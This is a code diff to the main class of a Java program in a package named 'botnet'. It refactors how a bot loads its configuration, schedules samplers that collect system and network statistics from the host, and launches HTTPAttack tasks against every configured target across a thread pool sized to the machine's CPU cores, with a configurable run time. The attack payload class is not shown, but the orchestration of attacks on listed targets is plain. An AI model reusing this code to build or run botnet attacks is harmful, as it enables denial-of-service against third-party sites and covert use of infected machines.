@@ -31,9 +31,10 @@ import com.acmutv.botnet.attacks.SystemSampler;
 import com.acmutv.botnet.control.BotShutdown;
 import com.acmutv.botnet.config.BotConfigurator;
 import com.acmutv.botnet.config.BotConfiguration;
-import com.acmutv.botnet.attacks.HTTPAttacker;
+import com.acmutv.botnet.attacks.HTTPAttack;
 import com.acmutv.botnet.model.Target;
 
+import java.time.LocalDateTime;
 import java.util.List;
 import java.util.concurrent.*;
 
@@ -51,19 +52,75 @@ public class BotMain {
    */
   public static void main(String[] args) {
 
-    BotConfiguration config = BotConfigurator.loadConfiguration(args);
+    BotConfigurator.loadConfiguration(args);
 
     registerShutdownHooks(new BotShutdown());
 
+    registerSamplers();
+
+    registerHTTPAttackers();
+  }
+
+  /**
+   * Registers both system and network samplers, according to the given configuration.
+   */
+  public static void registerSamplers() {
+    BotConfiguration config = BotConfiguration.getInstance();
+    final ScheduledExecutorService scheduler =
+        Executors.newScheduledThreadPool(2);
+
     if (config.isSysStat()) {
-      registerPeriodic(new SystemSampler(), 0, config.getSysStatFreq());
+      scheduler.scheduleAtFixedRate(
+          new SystemSampler(), 0, config.getSysStatFreq(), TimeUnit.SECONDS);
     }
 
     if (config.isNetStat()) {
-      registerPeriodic(new NetworkSampler(), 0, config.getSysStatFreq());
+      scheduler.scheduleAtFixedRate(
+          new NetworkSampler(), 0, config.getNetStatFreq(), TimeUnit.SECONDS);
     }
 
-    registerHTTPAttackers(config.getTargets());
+    scheduler.shutdown();
+
+    long maxtime = config.getMaxTime();
+    if (maxtime > 0) {
+      try {
+        if (scheduler.awaitTermination(maxtime, TimeUnit.SECONDS)) {
+          System.out.format("[MAIN THREAD %s] SAMPLERS THREAD POOL SHUTDOWN\n",
+              config.getDtf().format(LocalDateTime.now()));
+        }
+      } catch (InterruptedException e) {
+        e.printStackTrace();
+      }
+    }
+
+  }
+
+  /**
+   * Registers HTTP attackers, according to the given configuration.
+   */
+  private static void registerHTTPAttackers() {
+    BotConfiguration config = BotConfiguration.getInstance();
+    int numcores = Runtime.getRuntime().availableProcessors();
+    ExecutorService executor = Executors.newFixedThreadPool(numcores);
+
+    for (Target tgt : config.getTargets()) {
+      Runnable attacker = new HTTPAttack(tgt);
+      executor.execute(attacker);
+    }
+
+    executor.shutdown();
+
+    long maxtime = config.getMaxTime();
+    if (maxtime > 0) {
+      try {
+        if (executor.awaitTermination(maxtime, TimeUnit.SECONDS)) {
+          System.out.format("[MAIN THREAD %s] HTTP ATTACK THREAD POOL SHUTDOWN\n",
+              config.getDtf().format(LocalDateTime.now()));
+        }
+      } catch (InterruptedException e) {
+        e.printStackTrace();
+      }
+    }
   }
 
   /**
@@ -80,23 +137,6 @@ public class BotMain {
     }
   }
 
-  private static void registerHTTPAttackers(List<Target> targets) {
-    ExecutorService executor = Executors.newFixedThreadPool(10);
-
-    for (Target tgt : targets) {
-      Runnable attacker = new HTTPAttacker(tgt, true);
-      executor.execute(attacker);
-    }
-
-    executor.shutdown();
-
-    try {
-      executor.awaitTermination(60, TimeUnit.SECONDS);
-    } catch (InterruptedException e) {
-      e.printStackTrace();
-    }
-  }
-
   /**
    * Registers a periodic task.
    * @param task the task to execute.
@@ -108,8 +148,12 @@ public class BotMain {
         Executors.newScheduledThreadPool(1);
     final ScheduledFuture<?> handler =
         scheduler.scheduleAtFixedRate(task, delay, period, TimeUnit.SECONDS);
-    scheduler.schedule(new Runnable() {
-      public void run() { handler.cancel(true); }
-    }, 60 * 60, TimeUnit.SECONDS);
+
+    Runnable interrupt = () -> handler.cancel(true);
+
+    long maxtime = BotConfiguration.getInstance().getMaxTime();
+    if (maxtime > 0) {
+      scheduler.schedule(interrupt, maxtime, TimeUnit.SECONDS);
+    }
   }
 }
